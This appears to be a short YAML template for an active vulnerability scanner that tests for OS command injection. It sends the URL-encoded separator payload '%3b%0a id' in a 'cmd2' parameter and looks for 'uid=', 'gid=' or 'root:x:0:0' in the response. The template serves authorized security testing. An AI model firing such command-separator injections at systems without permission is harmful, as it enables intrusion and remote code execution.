id: cmdi5-84
name: 'Command separator abuse in cmd2'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via cmd2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cmd2:
        - '%3b%0a id'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'www-data'
